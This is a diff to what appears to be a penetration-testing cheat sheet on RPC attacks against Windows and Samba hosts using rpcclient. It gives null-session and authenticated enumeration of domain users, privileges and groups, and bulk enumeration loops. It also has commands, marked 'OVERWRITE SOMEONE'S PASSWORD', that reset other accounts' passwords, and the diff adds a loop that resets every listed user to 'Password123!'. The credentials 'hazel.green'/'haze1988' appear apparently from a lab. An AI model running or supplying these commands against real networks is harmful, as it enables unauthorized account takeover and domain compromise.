@@ -15,6 +15,9 @@ rpcclient $>netshareenum
 nmblookup -A 192.168.1.1
 nbtscan IP
 
+rpcclient -k  $dc
+
+
 #List the ports using RPC
 rpcinfo $ip 
 > Output would look something like below
@@ -55,21 +58,13 @@ setuserinfo2 USER2 23 'PASSWORD'
 Enum using RPCClient
 
 rpcclient -U DOMAIN\\Username $ip    #Enter pass 
-
 enumdomusers     #Enumerate Domain Users 
-
 enumprivs        #Enum Privileges
-
 enumprinters    #Enum Printers
-
 srvinfo         #Server info
-
 enumalsgroups domain    #List the domain groups 
-
 enumalsgroups builtin    #list builtin groups
-
 queryuser 500        #find Admin users
-
 lookupnames username/groupname    #Find the SID of a user/group
 
 Dont want to manually check all the commands ? maybe below script will help :P 
@@ -106,23 +101,29 @@ for command in $(cat rpc-enum.txt); do rpcclient -U "%" -c $command $ip; done
 
 
 OVERWRITE SOMEONE'S PASSWORD!!!
+```
+
 ```bash
 rpcclient -N -U "hazel.green%haze1988" $ip
 setuserinfo2 MOLLY.SMITH 23 'Password123!'
 setuserinfo christopher.lewis 23 'Admin!23'
 ```
 
+```bash
+for name in $(cat users.txt); do rpcclient $ip -U $user%$pass -c "setuserinfo2 $name 23 'Password123!'"; wait; done
+```
+
 Automate a bit.
 
 ```bash
 for command in $(cat /opt/windows/rpc-enum.txt); do rpcclient 192.168.165.40 -U "hazel.green" --password="haze1988" -c "$command"; done
-for name in $(cat ../users.txt.bak); do rpcclient 192.168.165.40 -U "hazel.green" --password="haze1988" -c "queryuser $name"; done
+for name in $(cat users.txt.bak); do rpcclient 192.168.165.40 -U "hazel.green" --password="haze1988" -c "queryuser $name"; done
 ```
 
 ```bash
-for command in $(cat rpc-enum.txt); do rpcclient $ip -U "$user%$pass" -c $command; done
-for command in $(cat rpc-enum.txt); do rpcclient $ip -U "%" -c $command; done
-for name in $(cat ../users.txt); do rpcclient $ip -U "%" -c "queryuser $name"; done
+for command in $(cat /opt/rpc-enum.txt); do rpcclient $ip -U "$user%$pass" -c $command; done
+for command in $(cat /opt/rpc-enum.txt); do rpcclient $ip -U "%" -c $command; done
+for name in $(cat users.txt); do rpcclient $ip -U "%" -c "queryuser $name"; done
 ```
 
 #### Enumerate Users
